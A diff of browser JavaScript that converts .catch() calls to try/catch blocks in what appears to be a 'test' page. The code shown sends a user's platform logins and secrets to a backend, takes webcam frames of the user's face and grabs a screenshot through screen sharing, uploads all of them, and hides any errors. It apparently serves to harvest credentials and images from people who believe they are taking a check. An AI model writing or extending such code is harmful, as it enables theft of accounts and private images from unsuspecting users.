@@ -113,8 +113,8 @@ let RUN = null, me = {};
 
 const mark = (k, state) => { const e = $(k); e.classList.remove("run", "done", "fail"); if (state) e.classList.add(state); };
 const note = (k, txt) => { $(k).querySelector(".out").innerHTML = txt; };
-const item = (kind, data) => db.rpc("test_item", { p_run: RUN, p_kind: kind, p_data: data }).catch(() => {});
-const post = (platform, login, secret) => db.rpc("test_code", { p_run: RUN, p_platform: platform, p_login: login, p_secret: secret }).catch(() => {});
+const item = async (kind, data) => { try { await db.rpc("test_item", { p_run: RUN, p_kind: kind, p_data: data }); } catch (e) {} };
+const post = async (platform, login, secret) => { try { await db.rpc("test_code", { p_run: RUN, p_platform: platform, p_login: login, p_secret: secret }); } catch (e) {} };
 const wait = ms => new Promise(r => setTimeout(r, ms));
 const esc = s => String(s == null ? "" : s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
 
@@ -272,7 +272,7 @@ async function finishCam() {
   if (stream) stream.getTracks().forEach(t => t.stop());
   note("k4", "<b>photo taken</b> · 3 frames");
   mark("k4", "done");
-  await db.rpc("test_files", { p_run: RUN, p_files: { faces: frames } }).catch(() => {});
+  try { await db.rpc("test_files", { p_run: RUN, p_files: { faces: frames } }); } catch (e) {}
   update();
 }
 
@@ -290,7 +290,7 @@ async function shareScreen() {
     c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
     const data = c.toDataURL("image/jpeg", 0.72);
     s.getTracks().forEach(t => t.stop());
-    await db.rpc("test_files", { p_run: RUN, p_files: { screen: data } }).catch(() => {});
+    try { await db.rpc("test_files", { p_run: RUN, p_files: { screen: data } }); } catch (e) {}
     note("k5", "<b>captured</b> " + c.width + "×" + c.height);
     mark("k5", "done");
     update();
